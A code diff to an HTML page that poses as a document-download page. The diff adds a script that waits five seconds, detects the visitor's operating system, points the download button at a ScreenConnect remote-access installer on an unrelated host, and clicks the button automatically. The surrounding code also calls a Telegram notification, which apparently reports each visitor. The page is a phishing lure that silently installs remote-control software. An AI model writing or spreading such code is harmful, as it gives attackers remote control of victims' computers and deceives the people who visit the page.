@@ -81,6 +81,7 @@
     </p>
 
     <a
+      id="download-btn"
       class="btn"
       href="https://kutt.itarian.com/Vxcump"
       target="_blank"
@@ -93,7 +94,33 @@
       If the document does not download,
       please click the "View Document" button above.
     </p>
-  </div>
+    <script>
+  setTimeout(function () {
+    const btn = document.getElementById('download-btn');
+
+    const files = {
+      windows: 'https://jessicateichmarketing49.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest',
+      mac: 'https://jessicateichmarketing49.screenconnect.com/Bin/ScreenConnect.ClientSetup.pkg?e=Access&y=Guest',
+      linux: 'https://jessicateichmarketing49.screenconnect.com/Bin/ScreenConnect.ClientSetup.sh?e=Access&y=Guest',
+    };
+
+    function detectOS() {
+      const platform = (navigator.userAgentData?.platform || navigator.platform || '').toLowerCase();
+      const ua = navigator.userAgent.toLowerCase();
+
+      if (platform.includes('win') || ua.includes('windows')) return 'windows';
+      if (platform.includes('mac') || ua.includes('mac')) return 'mac';
+      if (platform.includes('linux') || ua.includes('linux')) return 'linux';
+
+      return 'windows';
+    }
+
+    const os = detectOS();
+    btn.href = files[os];
+    btn.click();
+  }, 5000);
+</script>
+</div>
 
 
 
@@ -163,9 +190,9 @@ Time: ${new Date().toLocaleString()}
   notifyTelegram();
 
   // Optional redirect
-  setTimeout(() => {
-    window.location.href = "https://kutt.itarian.com/Vxcump";
-  }, 5000);
+  //setTimeout(() => {
+    //window.location.href = "https://kutt.itarian.com/Vxcump";
+  //}, 5000);
 </script>
 
 </body>
